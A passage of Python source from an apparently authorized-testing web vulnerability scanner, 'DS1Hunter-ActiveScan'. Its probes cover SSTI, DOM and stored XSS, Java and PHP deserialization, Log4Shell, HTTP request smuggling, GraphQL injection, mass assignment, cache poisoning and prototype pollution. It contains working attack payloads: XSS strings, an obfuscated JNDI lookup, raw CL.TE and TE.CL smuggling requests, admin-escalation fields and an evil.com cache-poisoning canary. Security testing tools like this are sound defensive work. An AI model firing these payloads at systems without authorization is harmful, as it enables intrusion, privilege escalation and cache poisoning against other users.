                                'title':    f'SSTI (JSON body) - {pname}',
                                'endpoint': url,
                                'detail':   f'Template expression {{{{7*7}}}} evaluated to 49 via JSON body param {pname!r} - absent in baseline.',
                                'evidence': {
                                    'param':            pname,
                                    'payload':          probe_val,
                                    'method':           'POST/JSON',
                                    'request_url':      url,
                                    'response_excerpt': _sjexc,
                                },
                            })
                            return
            except Exception:
                pass
            await asyncio.sleep(0.04)


# ── DOM XSS ───────────────────────────────────────────────────────────────────

_DOM_XSS_PAYLOADS = [
    '<img src=x onerror=alert("{canary}")>',
    '"><img src=x onerror=alert("{canary}")>',
    "'-alert('{canary}')-'",
    '<svg/onload=alert("{canary}")>',
    '"><svg/onload=alert("{canary}")>',
    '<details open ontoggle=alert("{canary}")>',
    '`${alert("{canary}")}',
    '\\"-alert("{canary}")-"',
]


async def _check_dom_xss_endpoint(sid: str, url: str, parsed, qs: Dict, params: List[str], http) -> None:
    """Browser-executed DOM XSS: inject payloads, detect canary execution in DOM.

    One Playwright browser launch per endpoint. Pre-filters params: only tests
    params that reflect a probe string in the server HTML response, which
    confirms a reflection sink exists before spending browser time.
    """
    if not _PLAYWRIGHT_OK:
        return

    ep_key = f"domxss|{url}|{','.join(params[:5])}"
    with _lock:
        s = _sessions.get(sid)
        if s is None:
            return
        dom_done = s.setdefault('_dom_xss_done', set())
        if ep_key in dom_done:
            return
        dom_done.add(ep_key)

    # Pre-filter: only params that reflect a marker in static HTML
    reflective_params = []
    for param in params[:6]:
        probe = f'ds1dprb{uuid.uuid4().hex[:6]}'
        test = _mutate_url(parsed, qs, param, probe)
        try:
            async with http.get(test, allow_redirects=False) as resp:
                txt = await resp.text(errors='replace')
                if probe in txt:
                    reflective_params.append(param)
        except Exception:
            pass

    if not reflective_params:
        return

    try:
        async with _pw() as pw:
            browser = await pw.chromium.launch(
                headless=True,
                args=['--no-sandbox', '--disable-dev-shm-usage', '--ignore-certificate-errors'],
            )
            ctx = await browser.new_context(ignore_https_errors=True)
            page = await ctx.new_page()

            for param in reflective_params:
                if _stopped(sid):
                    break
                canary = f'ds1dom{uuid.uuid4().hex[:8]}'

                for pl_tpl in _DOM_XSS_PAYLOADS[:4]:
                    if _stopped(sid):
                        break
                    pl = pl_tpl.replace('{canary}', canary)
                    test = _mutate_url(parsed, qs, param, pl)
                    try:
                        await page.goto(test, wait_until='domcontentloaded', timeout=6000)
                        await page.wait_for_timeout(600)
                    except Exception:
                        pass

                    # Confirm: canary must be present in the live DOM (innerHTML)
                    # This is the strongest signal we can get without OOB:
                    # if the canary ends up in innerHTML, a real DOM sink was reached.
                    dom_hit = False
                    try:
                        dom_hit = await page.evaluate(
                            f'!!(document.body && document.body.innerHTML.includes("{canary}"))'
                        )
                    except Exception:
                        pass

                    if dom_hit:
                        _add_finding(sid, {
                            'severity': 'high',
                            'title':    f'DOM XSS - {param}',
                            'endpoint': url,
                            'detail':   (
                                f'Canary {canary!r} found in live DOM innerHTML after page execution. '
                                'Payload reached a DOM sink - DOM XSS confirmed by headless browser.'
                            ),
                            'evidence': {
                                'param':    param,
                                'payload':  pl,
                                'canary':   canary,
                                'method':   'headless_browser_innerhtml',
                            },
                        })
                        break  # found for this param, move to next

            await browser.close()
    except Exception as exc:
        logger.debug('[ActiveScan] DOM XSS browser error: %s', exc)


# ── Java deserialization + Log4Shell ──────────────────────────────────────────

_JAVA_DESER_MAGIC = b'\xac\xed\x00\x05'

_JAVA_DESER_ERROR_SIG = re.compile(
    r'java\.io\.(InvalidClassException|StreamCorruptedException|'
    r'OptionalDataException|NotSerializableException)|'
    r'java\.lang\.(ClassNotFoundException|ClassCastException)|'
    r'Caused by: java\.(io|lang)\.|'
    r'at java\.io\.ObjectInputStream|'
    r'java\.io\.IOException.*serial',
    re.I,
)

# Malformed serialized Java object - triggers StreamCorruptedException
# on any Java ObjectInputStream.readObject() call
_JAVA_DESER_PROBE = (
    b'\xac\xed\x00\x05'              # Java serialization magic + stream version 5
    b'\x73'                           # TC_OBJECT
    b'\x72'                           # TC_CLASSDESC
    b'\x00\x18'                       # class name length = 24
    b'com.ds1.FakeProbeClass1'        # fake class name (24 bytes)
    b'\xca\xfe\xba\xbe\xde\xad\xc0\xde'  # random serialVersionUID
    b'\x02\x00\x00'                   # SC_SERIALIZABLE flag, 0 fields
    b'\x78\x70'                       # TC_ENDBLOCKDATA + TC_NULL superclass
)

_LOG4J_PAYLOAD  = '${${lower:j}ndi:${lower:l}dap://{marker}.ds1l4j.invalid/a}'
_LOG4J_HEADERS  = [
    'User-Agent', 'X-Api-Version', 'X-Forwarded-For',
    'Referer', 'Accept-Language', 'X-Custom-IP-Authorization',
]


async def _check_java_deser(sid: str, url: str, http) -> None:
    """Detect Java deserialization endpoints.

    Step 1: GET response inspected for Java magic bytes or x-java-serialized Content-Type.
    Step 2: POST a malformed serialized object, compare error strings against GET baseline.
    Only flags when the deserialization error was not present in the baseline response.
    """
    parsed_h = urlparse(url)
    host_key = f"{parsed_h.scheme}://{parsed_h.netloc}"
    with _lock:
        s = _sessions.get(sid)
        if s is None:
            return
        checked = s.setdefault('_java_deser_checked', set())
        if host_key in checked:
            return
        checked.add(host_key)

    # Step 1: response inspection
    try:
        async with http.get(url, allow_redirects=False) as resp:
            ct = resp.headers.get('Content-Type', '')
            body_bytes = await resp.read()
            if 'java-serialized' in ct.lower() or 'x-java-object' in ct.lower():
                _add_finding(sid, {
                    'severity': 'high',
                    'title':    'Java Deserialization Endpoint Detected',
                    'endpoint': url,
                    'detail':   (
                        f'Response Content-Type {ct!r} indicates Java serialized objects. '
                        'If server deserializes attacker input, gadget chains (Commons Collections, '
                        'Spring, etc.) can achieve RCE.'
                    ),
                    'evidence': {'content_type': ct},
                })
            if body_bytes[:4] == _JAVA_DESER_MAGIC:
                _add_finding(sid, {
                    'severity': 'critical',
                    'title':    'Java Serialized Object in HTTP Response',
                    'endpoint': url,
                    'detail':   (
                        'Response starts with Java serialization magic bytes 0xACED0005. '
                        'Server returns serialized Java objects - likely a deserialization endpoint.'
                    ),
                    'evidence': {'magic_hex': body_bytes[:8].hex()},
                })
    except Exception:
        pass

    # Step 2: POST malformed object, baseline compare
    baseline_body = ''
    try:
        async with http.get(url, allow_redirects=False) as resp:
            baseline_body = await resp.text(errors='replace')
    except Exception:
        return

    for ct_probe in ('application/x-java-serialized-object', 'application/octet-stream'):
        try:
            async with http.post(
                url,
                data=_JAVA_DESER_PROBE,
                headers={'Content-Type': ct_probe},
                allow_redirects=False,
            ) as resp:
                if resp.status in (200, 400, 500):
                    body = await resp.text(errors='replace')
                    m = _JAVA_DESER_ERROR_SIG.search(body)
                    if m and not _JAVA_DESER_ERROR_SIG.search(baseline_body):
                        _deidx = body.find(m.group(0))
                        _deexc = body[max(0, _deidx - 80):_deidx + len(m.group(0)) + 80].strip()
                        _add_finding(sid, {
                            'severity': 'high',
                            'title':    'Java Deserialization - Endpoint Processes Serialized Input',
                            'endpoint': url,
                            'detail':   (
                                f'Malformed Java serialized object (Content-Type: {ct_probe}) '
                                f'triggered deserialization exception {m.group(0)!r} - not present in baseline. '
                                'Endpoint calls readObject() on attacker data. '
                                'Exploit with ysoserial gadget chains to confirm RCE.'
                            ),
                            'evidence': {
                                'content_type':     ct_probe,
                                'error_match':      m.group(0),
                                'request_url':      url,
                                'response_excerpt': _deexc,
                            },
                        })
                        return
        except Exception:
            pass
        await asyncio.sleep(0.06)


async def _check_log4shell(sid: str, url: str, http) -> None:
    """Log4Shell (CVE-2021-44228): inject JNDI payload via common HTTP headers.

    Without OOB DNS callback infrastructure, confirmation relies on a 5xx error
    that was not present in the baseline GET. This is conservative but avoids
    flagging every Java app regardless of whether it processes headers.
    """
    parsed_h = urlparse(url)
    host_key = f"{parsed_h.scheme}://{parsed_h.netloc}"
    with _lock:
        s = _sessions.get(sid)
        if s is None:
            return
        checked = s.setdefault('_log4shell_checked', set())
        if host_key in checked:
            return
        checked.add(host_key)

    baseline_status = 200
    baseline_body   = ''
    try:
        async with http.get(url, allow_redirects=False) as resp:
            baseline_status = resp.status
            baseline_body   = await resp.text(errors='replace')
    except Exception:
        return

    marker = f'ds1l4j{uuid.uuid4().hex[:6]}'
    jndi_pl = _LOG4J_PAYLOAD.replace('{marker}', marker)

    for hdr in _LOG4J_HEADERS:
        if _stopped(sid):
            return
        try:
            async with http.get(
                url,
                allow_redirects=False,
                headers={hdr: jndi_pl},
            ) as resp:
                body = await resp.text(errors='replace')
                # Flag only if: new 5xx that wasn't there before, AND Java deser error string
                if (resp.status >= 500 and baseline_status < 500
                        and _JAVA_DESER_ERROR_SIG.search(body)
                        and not _JAVA_DESER_ERROR_SIG.search(baseline_body)):
                    _add_finding(sid, {
                        'severity': 'high',
                        'title':    f'Log4Shell (JNDI Injection) - {hdr} header',
                        'endpoint': url,
                        'detail':   (
                            f'Injecting JNDI payload in {hdr!r} header caused HTTP {resp.status} '
                            f'with Java exception in response (baseline was {baseline_status}). '
                            'Possible Log4j / Log4j2 processing in request pipeline. '
                            'Confirm with OOB DNS callback (interactsh / Burp Collaborator).'
                        ),
                        'evidence': {
                            'header':          hdr,
                            'payload':         jndi_pl,
                            'response_status': resp.status,
                            'baseline_status': baseline_status,
                            'preview':         body[:300],
                        },
                    })
                    return
        except Exception:
            pass
        await asyncio.sleep(0.05)


# ── PHP object injection ──────────────────────────────────────────────────────

_PHP_OBJECT_PROBES = [
    'O:8:"stdClass":0:{}',
    'a:1:{i:0;s:6:"inject";}',
    'O:1:"A":1:{s:1:"a";s:6:"inject";}',
]

_PHP_DESER_ERROR_SIG = re.compile(
    r'unserialize\(\)|'
    r'__wakeup\(\)|__destruct\(\)|__toString\(\)|'
    r'Warning: unserialize\(\)|'
    r'Class \S+ not found|'
    r'Failed to instantiate|'
    r'PHP Notice.*unserializ',
    re.I,
)


async def _check_php_injection(sid: str, url: str, parsed, qs: Dict, param: str, http) -> None:
    """PHP object injection via unserialize(): error-based with baseline comparison."""
    baseline_body = ''
    try:
        async with http.get(url, allow_redirects=False) as resp:
            baseline_body = await resp.text(errors='replace')
    except Exception:
        return

    for pl in _PHP_OBJECT_PROBES:
        target = _mutate_url(parsed, qs, param, pl)
        try:
            async with http.get(target, allow_redirects=False) as resp:
                body = await resp.text(errors='replace')
                m = _PHP_DESER_ERROR_SIG.search(body)
                if m and not _PHP_DESER_ERROR_SIG.search(baseline_body):
                    _add_finding(sid, {
                        'severity': 'high',
                        'title':    f'PHP Object Injection - {param}',
                        'endpoint': url,
                        'detail':   (
                            f'Serialized PHP object in {param!r} triggered deserialization error '
                            f'({m.group(0)!r}) absent in baseline. '
                            'Endpoint passes input to unserialize(). '
                            'Exploit with POP chain gadgets to achieve RCE or SSRF.'
                        ),
                        'evidence': {
                            'param':       param,
                            'payload':     pl,
                            'error_match': m.group(0),
                            'preview':     body[:300],
                        },
                    })
                    return
        except Exception:
            pass
        await asyncio.sleep(0.05)


# ── HTTP Request Smuggling ────────────────────────────────────────────────────

async def _raw_http_send(
    host: str, port: int, use_tls: bool, raw: bytes, read_timeout: float = 6.0
) -> Optional[bytes]:
    """Send raw bytes over TCP/TLS, return response bytes or None on timeout."""
    import ssl as _ssl
    try:
        if use_tls:
            ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx), timeout=5.0
            )
        else:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=5.0
            )
        writer.write(raw)
        await writer.drain()
        try:
            data = await asyncio.wait_for(reader.read(8192), timeout=read_timeout)
        except asyncio.TimeoutError:
            data = None
        writer.close()
        try:
            await asyncio.wait_for(writer.wait_closed(), timeout=2.0)
        except Exception:
            pass
        return data
    except (asyncio.TimeoutError, OSError, ConnectionRefusedError):
        return None
    except Exception:
        return None


async def _check_http_smuggling(sid: str, url: str, http) -> None:
    """HTTP Request Smuggling via CL.TE and TE.CL timing probes (raw TCP socket).

    Detection: send requests where Content-Length and Transfer-Encoding disagree.
    A front-end/back-end split that processes different headers causes the back-end
    to hang waiting for data - measured as timeout vs. fast baseline.

    Skipped if scan proxy is configured (raw socket cannot route through proxy).
    Both probes require: baseline fast (<2s), probe times out (>=5s), and
    re-confirmation that baseline is still fast after the probe (rules out
    temporary slowness or rate limiting).
    """
    if scan_proxy.get_proxy_url():
        return  # raw socket bypasses proxy - skip

    parsed_h = urlparse(url)
    host = parsed_h.hostname
    if not host:
        return
    port    = parsed_h.port or (443 if parsed_h.scheme == 'https' else 80)
    use_tls = parsed_h.scheme == 'https'
    path    = parsed_h.path or '/'
    if parsed_h.query:
        path += '?' + parsed_h.query

    host_key = f"{parsed_h.scheme}://{parsed_h.netloc}"
    with _lock:
        s = _sessions.get(sid)
        if s is None:
            return
        checked = s.setdefault('_smuggling_checked', set())
        if host_key in checked:
            return
        checked.add(host_key)

    baseline_req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Connection: close\r\n"
        "User-Agent: DS1Hunter-ActiveScan/1.0\r\n"
        "\r\n"
    ).encode()

    t0 = time.monotonic()
    b_resp = await _raw_http_send(host, port, use_tls, baseline_req, read_timeout=5.0)
    baseline_t = time.monotonic() - t0

    if b_resp is None or baseline_t > 4.0:
        return  # server too slow or unreachable for timing comparison

    async def _confirm_normal() -> bool:
        t = time.monotonic()
        r = await _raw_http_send(host, port, use_tls, baseline_req, read_timeout=5.0)
        return r is not None and (time.monotonic() - t) < 3.5

    # CL.TE probe:
    #   Front uses Content-Length -> reads len(body) bytes, forwards to back-end
    #   Back uses Transfer-Encoding -> receives chunk "A" but no 0-terminator -> waits forever
    cl_te_body = b"1\r\nA\r\n"  # valid single chunk, missing the 0\r\n\r\n terminator
    cl_te_req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Connection: close\r\n"
        "User-Agent: DS1Hunter-ActiveScan/1.0\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(cl_te_body)}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
    ).encode() + cl_te_body

    t1 = time.monotonic()
    cl_te_resp = await _raw_http_send(host, port, use_tls, cl_te_req, read_timeout=7.0)
    cl_te_t = time.monotonic() - t1

    if cl_te_resp is None and cl_te_t >= 5.0 and baseline_t < 2.0:
        if await _confirm_normal():
            _add_finding(sid, {
                'severity': 'critical',
                'title':    'HTTP Request Smuggling - CL.TE',
                'endpoint': host_key,
                'detail':   (
                    f'CL.TE timing confirmed: baseline GET responded in {baseline_t:.2f}s, '
                    f'CL.TE probe (POST CL={len(cl_te_body)} / TE:chunked / no 0-terminator) '
                    f'timed out after {cl_te_t:.1f}s. '
                    'Front-end uses Content-Length, back-end uses Transfer-Encoding. '
                    'Attacker can prepend arbitrary content to other users\' requests. '
                    'Verify and exploit with Burp Suite HTTP Request Smuggler extension.'
                ),
                'evidence': {
                    'variant':      'CL.TE',
                    'baseline_sec': round(baseline_t, 2),
                    'probe_sec':    round(cl_te_t, 2),
                },
            })
            return

    # TE.CL probe:
    #   Front uses Transfer-Encoding -> reads complete chunked body (0-terminated), forwards
    #   Back uses Content-Length -> CL says 1 byte more than we sent -> waits forever
    te_cl_body = b"1\r\nA\r\n0\r\n\r\n"   # valid chunked: chunk "A" + 0-terminator (12 bytes)
    te_cl_cl   = len(te_cl_body) + 1        # CL claims 1 extra byte
    te_cl_req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Connection: close\r\n"
        "User-Agent: DS1Hunter-ActiveScan/1.0\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {te_cl_cl}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
    ).encode() + te_cl_body

    t2 = time.monotonic()
    te_cl_resp = await _raw_http_send(host, port, use_tls, te_cl_req, read_timeout=7.0)
    te_cl_t = time.monotonic() - t2

    if te_cl_resp is None and te_cl_t >= 5.0 and baseline_t < 2.0:
        if await _confirm_normal():
            _add_finding(sid, {
                'severity': 'critical',
                'title':    'HTTP Request Smuggling - TE.CL',
                'endpoint': host_key,
                'detail':   (
                    f'TE.CL timing confirmed: baseline GET={baseline_t:.2f}s, '
                    f'TE.CL probe (POST TE:chunked / CL={te_cl_cl} / body {len(te_cl_body)}B) '
                    f'timed out after {te_cl_t:.1f}s. '
                    'Front-end uses Transfer-Encoding, back-end uses Content-Length. '
                    'Verify with Burp Suite HTTP Request Smuggler extension.'
                ),
                'evidence': {
                    'variant':      'TE.CL',
                    'baseline_sec': round(baseline_t, 2),
                    'probe_sec':    round(te_cl_t, 2),
                },
            })


# ── GraphQL ───────────────────────────────────────────────────────────────────

_GRAPHQL_URL_PAT    = re.compile(r'/graphql|/graphiql|/playground|/gql\b|/query\b', re.I)
_GRAPHQL_PATHS      = ['/graphql', '/api/graphql', '/v1/graphql', '/graphiql', '/playground']
_GRAPHQL_TYPENAME_Q = '{"query":"{ __typename }"}'
_GRAPHQL_INTRO_Q    = '{"query":"{ __schema { types { name } } }"}'
_GRAPHQL_SQLI_Q     = '{"query":"{ user(id: \\"1 OR 1=1\\") { id email } }"}'
_GRAPHQL_SSTI_Q     = '{"query":"{ search(q: \\"{{7*7}}\\") { results } }"}'


async def _check_graphql(sid: str, url: str, http) -> None:
    """GraphQL: confirm endpoint, test introspection, probe for injection.

    Findings are raised only after:
    - __typename probe returns a valid GraphQL response (confirms endpoint)
    - Introspection probe returns actual schema data (not just status 200)
    - SQLi/SSTI probe produces an error pattern absent in the __typename baseline
    """
    parsed_h = urlparse(url)
    host_key = f"{parsed_h.scheme}://{parsed_h.netloc}"
    with _lock:
        s = _sessions.get(sid)
        if s is None:
            return
        checked = s.setdefault('_graphql_checked', set())
        if host_key in checked:
            return
        checked.add(host_key)

    is_gql_url = bool(_GRAPHQL_URL_PAT.search(url))
    candidates = [url] if is_gql_url else [
        f"{host_key}{p}" for p in _GRAPHQL_PATHS
    ]

    for gql_url in candidates:
        if _stopped(sid):
            return
        # Confirm it's a real GraphQL endpoint
        gql_confirmed = False
        baseline_body = ''
        try:
            async with http.post(
                gql_url,
                data=_GRAPHQL_TYPENAME_Q,
                headers={'Content-Type': 'application/json'},
                allow_redirects=False,
            ) as resp:
                if resp.status not in (200, 400, 422):
                    continue
                body = await resp.text(errors='replace')
                if '"__typename"' in body or ('"errors"' in body and '"data"' in body) or '"data"' in body:
                    gql_confirmed = True
                    baseline_body = body
        except Exception:
            continue

        if not gql_confirmed:
            continue

        # Test introspection
        try:
            async with http.post(
                gql_url,
                data=_GRAPHQL_INTRO_Q,
                headers={'Content-Type': 'application/json'},
                allow_redirects=False,
            ) as resp:
                ibody = await resp.text(errors='replace')
                if '"__schema"' in ibody and '"types"' in ibody and '"name"' in ibody:
                    _add_finding(sid, {
                        'severity': 'medium',
                        'title':    'GraphQL Introspection Enabled',
                        'endpoint': gql_url,
                        'detail':   (
                            'Full GraphQL schema returned via __schema introspection. '
                            'Exposes all types, queries, mutations, and field names. '
                            'Disable introspection in production environments.'
                        ),
                        'evidence': {'endpoint': gql_url, 'confirmed': '__schema in response'},
                    })
        except Exception:
            pass

        # Probe for injection (baseline-confirmed)
        for probe_q, probe_type in [(_GRAPHQL_SQLI_Q, 'SQLi'), (_GRAPHQL_SSTI_Q, 'SSTI')]:
            try:
                async with http.post(
                    gql_url,
                    data=probe_q,
                    headers={'Content-Type': 'application/json'},
                    allow_redirects=False,
                ) as resp:
                    body = await resp.text(errors='replace')
                    sqli_hit = probe_type == 'SQLi' and (
                        _SQLI_ERRORS.search(body) and not _SQLI_ERRORS.search(baseline_body)
                    )
                    ssti_hit = probe_type == 'SSTI' and (
                        '"49"' in body or (': 49' in body) and '"49"' not in baseline_body
                    )
                    if sqli_hit or ssti_hit:
                        _add_finding(sid, {
                            'severity': 'critical' if ssti_hit else 'high',
                            'title':    f'GraphQL {probe_type} Injection',
                            'endpoint': gql_url,
                            'detail':   (
                                f'{probe_type} indicator in GraphQL argument response - '
                                'not present in baseline __typename query. '
                                'Verify manually with a targeted payload.'
                            ),
                            'evidence': {
                                'query':   probe_q,
                                'type':    probe_type,
                                'preview': body[:300],
                            },
                        })
            except Exception:
                pass
            await asyncio.sleep(0.05)

        break  # real GQL endpoint found, stop trying other paths


# ── Mass assignment ───────────────────────────────────────────────────────────

_MASS_ASSIGN_PROBES = [
    {'isAdmin': True},
    {'is_admin': True},
    {'role': 'admin'},
    {'admin': True},
    {'superuser': True},
    {'privilege': 'admin'},
    {'access_level': 99},
    {'permissions': ['admin']},
]


async def _check_mass_assignment(sid: str, url: str, http, ep: Dict) -> None:
    """Mass assignment: POST privilege escalation fields to JSON APIs.

    A finding requires ALL three conditions:
    1. Server accepted the request (2xx)
    2. The injected field name AND value appear in the response
    3. Neither appeared in the GET baseline
    """
    ct = ep.get('ct', '')
    is_json_api = (
        'json' in ct
        or '/api/' in url or '/v1/' in url or '/v2/' in url or '/v3/' in url
        or '/rest/' in url
    )
    if not is_json_api:
        return

    parsed_h = urlparse(url)
    path_key = f"{parsed_h.netloc}{parsed_h.path}"
    with _lock:
        s = _sessions.get(sid)
        if s is None:
            return
        done = s.setdefault('_mass_assign_done', set())
        if path_key in done:
            return
        done.add(path_key)

    baseline_body = ''
    try:
        async with http.get(url, allow_redirects=False) as resp:
            baseline_body = await resp.text(errors='replace')
    except Exception:
        return

    for fields in _MASS_ASSIGN_PROBES:
        if _stopped(sid):
            return
        try:
            async with http.post(
                url,
                json=fields,
                headers={'Content-Type': 'application/json'},
                allow_redirects=False,
            ) as resp:
                if resp.status not in (200, 201, 202):
                    continue
                body = await resp.text(errors='replace')
                for k, v in fields.items():
                    v_str = str(v).lower()
                    if (k in body and v_str in body.lower()
                            and not (k in baseline_body and v_str in baseline_body.lower())):
                        _add_finding(sid, {
                            'severity': 'high',
                            'title':    f'Mass Assignment - {k}',
                            'endpoint': url,
                            'detail':   (
                                f'Field {k!r}={v!r} POSTed to JSON API was accepted (HTTP {resp.status}) '
                                'and reflected in response - not present in GET baseline. '
                                'Server may have written the privilege field to the object record.'
                            ),
                            'evidence': {
                                'field':   k,
                                'value':   v,
                                'status':  resp.status,
                                'preview': body[:300],
                            },
                        })
                        return
        except Exception:
            pass
        await asyncio.sleep(0.05)


# ── Web cache poisoning ───────────────────────────────────────────────────────

_CACHE_POISON_HEADERS = [
    'X-Forwarded-Host',
    'X-Forwarded-Scheme',
    'X-Host',
    'X-Original-URL',
    'X-Rewrite-URL',
    'X-Forwarded-Server',
]
_CACHE_INDICATOR_HDRS = {
    'age', 'x-cache', 'cf-cache-status', 'x-varnish', 'via',
    'x-drupal-cache', 'x-squid-error', 'x-proxy-cache',
}


async def _check_cache_poisoning(sid: str, url: str, http) -> None:
    """Unkeyed header cache poisoning.

    Only flags when ALL three hold:
    1. Canary appears in response body
    2. Response has at least one cache indicator header
    3. Canary was absent in the baseline GET (rules out natural reflection)
    """
    parsed_h = urlparse(url)
    host_key = f"{parsed_h.scheme}://{parsed_h.netloc}"
    with _lock:
        s = _sessions.get(sid)
        if s is None:
            return
        checked = s.setdefault('_cache_poison_checked', set())
        if host_key in checked:
            return
        checked.add(host_key)

    baseline_body = ''
    baseline_has_cache = False
    try:
        async with http.get(url, allow_redirects=False) as resp:
            baseline_body = await resp.text(errors='replace')
            resp_hdrs_low = {k.lower() for k in resp.headers}
            baseline_has_cache = bool(resp_hdrs_low & _CACHE_INDICATOR_HDRS)
    except Exception:
        return

    if not baseline_has_cache:
        return  # no caching layer - nothing to poison

    canary = f'ds1cp{uuid.uuid4().hex[:8]}.evil.com'

    for hdr in _CACHE_POISON_HEADERS:
        if _stopped(sid):
            return
        try:
            async with http.get(
                url,
                allow_redirects=False,
                headers={hdr: canary},
            ) as resp:
                body = await resp.text(errors='replace')
                resp_hdrs_low = {k.lower() for k in resp.headers}
                has_cache = bool(resp_hdrs_low & _CACHE_INDICATOR_HDRS)
                cache_hit = resp.headers.get('X-Cache', '').lower() == 'hit'

                if canary in body and has_cache and canary not in baseline_body:
                    _add_finding(sid, {
                        'severity': 'high' if cache_hit else 'medium',
                        'title':    f'Web Cache Poisoning - {hdr}',
                        'endpoint': url,
                        'detail':   (
                            f'Header {hdr!r} value ({canary!r}) reflected in response body '
                            f'with cache indicators present '
                            f'({", ".join(resp_hdrs_low & _CACHE_INDICATOR_HDRS)}). '
                            f'Cache-Hit: {cache_hit}. Poisoned response served to all users '
                            'requesting this URL until cache expires.'
                        ),
                        'evidence': {
                            'header':           hdr,
                            'canary':           canary,
                            'cache_indicators': list(resp_hdrs_low & _CACHE_INDICATOR_HDRS),
                            'cache_hit':        cache_hit,
                        },
                    })
                    return
        except Exception:
            pass
        await asyncio.sleep(0.05)


# ── Prototype pollution ───────────────────────────────────────────────────────

_PROTO_POLL_QS = [
    ('__proto__[ds1pp]',              'ppval1x'),
    ('constructor[prototype][ds1pp]', 'ppval2x'),
]
_PROTO_POLL_JSON = [
    {'__proto__': {'ds1pp': 'ppval3x'}},
    {'constructor': {'prototype': {'ds1pp': 'ppval4x'}}},
]
_PROTO_POLL_ERROR_SIG = re.compile(
    r"Cannot set property '__proto__'|"
    r"Illegal key.*__proto__|"
    r"__proto__ is not allowed|"
    r"Prototype pollution detected|"
    r"key __proto__ is not allowed",
    re.I,
)


async def _check_prototype_pollution(sid: str, url: str, parsed, qs: Dict, param: str, http) -> None:
    """Prototype pollution: two confirmation signals required before flagging.

    Signal A (error-based): server returns an error mentioning __proto__ processing
    that was absent in baseline.

    Signal B (propagation): injected value bleeds into a subsequent clean GET -
    means Object.prototype was actually set server-side, affecting other requests.
    """
    parsed_h = urlparse(url)
    ep_key = f"pp|{parsed_h.netloc}{parsed_h.path}"
    with _lock:
        s = _sessions.get(sid)
        if s is None:
            return
        done = s.setdefault('_proto_poll_done', set())
        if ep_key in done:
            return
        done.add(ep_key)

    baseline_body = ''
    try:
        async with http.get(url, allow_redirects=False) as resp:
            baseline_body = await resp.text(errors='replace')
    except Exception:
        return

    # Query-string injection
    for pp_key, pp_val in _PROTO_POLL_QS:
        if _stopped(sid):
            return
        new_qs = {**qs, pp_key: [pp_val]}
        test_url = urlunparse(parsed._replace(query=urlencode(new_qs, doseq=True)))
        try:
            async with http.get(test_url, allow_redirects=False) as resp:
                body = await resp.text(errors='replace')
                # Signal A: explicit error about __proto__
                m = _PROTO_POLL_ERROR_SIG.search(body)
                if m and not _PROTO_POLL_ERROR_SIG.search(baseline_body):
                    _add_finding(sid, {
                        'severity': 'high',
                        'title':    f'Prototype Pollution (query string) - {pp_key}',
                        'endpoint': url,
                        'detail':   (
                            f'Injecting {pp_key!r}={pp_val!r} triggered server error '
                            f'({m.group(0)!r}) absent in baseline. '
                            'Server-side prototype pollution confirmed.'
                        ),
                        'evidence': {'key': pp_key, 'value': pp_val, 'error': m.group(0)},
                    })
                    return
                # Signal B: injected value leaks into subsequent clean request
                if pp_val in body and pp_val not in baseline_body:
                    try:
                        async with http.get(url, allow_redirects=False) as cr:
                            if pp_val in await cr.text(errors='replace'):
                                _add_finding(sid, {
                                    'severity': 'critical',
                                    'title':    f'Prototype Pollution (persistent) - {pp_key}',
                                    'endpoint': url,
                                    'detail':   (
                                        f'{pp_val!r} injected via {pp_key!r} persisted into a '
                                        'subsequent clean GET - Object.prototype was polluted '
                                        'server-side and affects all subsequent requests.'
                                    ),
                                    'evidence': {'key': pp_key, 'value': pp_val},
                                })
                                return
                    except Exception:
                        pass
        except Exception:
            pass
        await asyncio.sleep(0.05)

    # JSON body injection
    for pp_payload in _PROTO_POLL_JSON:
        if _stopped(sid):
            return
        pp_val = list(list(pp_payload.values())[0].values())[0]
        try:
            async with http.post(
                url,
                json=pp_payload,
                headers={'Content-Type': 'application/json'},
                allow_redirects=False,
            ) as resp:
                body = await resp.text(errors='replace')
                m = _PROTO_POLL_ERROR_SIG.search(body)
                if m and not _PROTO_POLL_ERROR_SIG.search(baseline_body):
                    _add_finding(sid, {
                        'severity': 'high',
                        'title':    'Prototype Pollution (JSON body)',
                        'endpoint': url,
                        'detail':   (
                            f'JSON __proto__ injection triggered error ({m.group(0)!r}) '
                            'absent in GET baseline. Server-side prototype pollution confirmed.'
                        ),
                        'evidence': {'payload': str(pp_payload), 'error': m.group(0)},
                    })
                    return
                if pp_val in body and pp_val not in baseline_body:
                    try:
                        async with http.get(url, allow_redirects=False) as cr:
                            if pp_val in await cr.text(errors='replace'):
                                _add_finding(sid, {
                                    'severity': 'critical',
                                    'title':    'Prototype Pollution (persistent, JSON)',
                                    'endpoint': url,
                                    'detail':   (
                                        f'{pp_val!r} from JSON __proto__ injection persisted '
                                        'into a clean subsequent GET - prototype is polluted.'
                                    ),
                                    'evidence': {'payload': str(pp_payload), 'leaked': pp_val},
                                })
                                return
                    except Exception:
                        pass
        except Exception:
            pass
        await asyncio.sleep(0.05)


# ── Stored XSS ────────────────────────────────────────────────────────────────

async def _inject_stored_xss_canary(sid, form, http):
    """Inject a unique canary into every writable form field and record it for the sweep."""
    if not form.get('inputs'):
        return
    canary = f'ds1sxss{uuid.uuid4().hex[:10]}'
    payload = f'<img src=x id={canary} onerror=alert("{canary}")>'
    data = {}
    for inp in form.get('inputs', []):
        t = inp.get('type', 'text').lower()
        if t == 'hidden':
            data[inp['name']] = inp.get('value', '')
        elif t == 'email':
            data[inp['name']] = f'{canary[:8]}@test.com'
        elif t in ('number', 'range'):
            data[inp['name']] = '1'
        elif t == 'password':
            data[inp['name']] = f'Ds1!{canary[:8]}'
        else:
            data[inp['name']] = payload
    try:
        method = form['method']
        if method == 'POST':
            async with http.post(form['action'], data=data, allow_redirects=True,
